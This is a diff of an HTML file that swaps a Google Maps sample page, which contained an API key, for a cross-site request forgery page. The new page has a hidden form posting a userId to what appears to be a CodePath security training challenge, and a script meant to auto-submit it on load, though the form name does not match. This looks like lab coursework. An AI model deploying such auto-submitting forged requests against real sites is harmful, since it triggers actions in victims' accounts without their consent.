@@ -1,49 +1,14 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Simple Map</title>
-    <meta name="viewport" content="initial-scale=1.0">
-    <meta charset="utf-8">
-    <style>
-      /* Always set the map height explicitly to define the size of the div
-       * element that contains the map. */
-      #map {
-        height: 100%;
-      }
-      /* Optional: Makes the sample page fill the window. */
-      html, body {
-        height: 100%;
-        margin: 0;
-        padding: 0;
-      }
-    </style>
-  </head>
+  <head></head>
   <body>
-    <div id="map"></div>
-    <script>
-      var map;
-      function initMap() {
-        map = new google.maps.Map(document.getElementById('map'), {
-          center: {lat: -34.397, lng: 150.644},
-          zoom: 8
-        });
-      }
-    </script>
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBEwTHbtuO_TmNdoxPvyyrNCMkzDzeBfp0&callback=initMap"
-    async defer></script>
-//       function myFunction() {
-//         document.getElementById("demo").innerHTML = "Let's do it!";
-//       }
-  </body>
-</html>
-
-<style>
-  #map {
-    height: 100%;
-  }
-  html, body {
-    height: 100%;
-    margin: 0;
-    padding: 0;
-  }
-</style>
+<h3> Let's try this </h3>
+<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
+    <input type="hidden" name="userId" value="d47ca0b31c9eb118ac37ecfcc8a2741d05743e29"/>
+    <input type="submit"/>
+  </form>
+<script>
+ document.csrfform.submit();
+</script>
+</body>
+</html> 
